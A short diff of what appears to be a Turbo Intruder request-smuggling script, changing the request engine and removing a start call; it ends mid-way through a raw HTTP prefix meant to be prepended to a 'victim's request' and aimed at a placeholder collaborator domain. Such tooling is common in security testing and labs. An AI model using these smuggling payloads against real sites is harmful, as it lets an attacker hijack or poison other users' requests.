@@ -8,10 +8,8 @@ def queueRequests(target, wordlists):
                            timeout=10,
                            pipeline=False,
                            maxRetriesPerRequest=0,
-                           engine=Engine.BURP,
+                           engine=Engine.THREADED,
                            )
-    engine.start()
-
     # This will prefix the victim's request. Edit it to achieve the desired effect.
     prefix = '''GET / HTTP/1.1
 Host: your-collaborator-domain
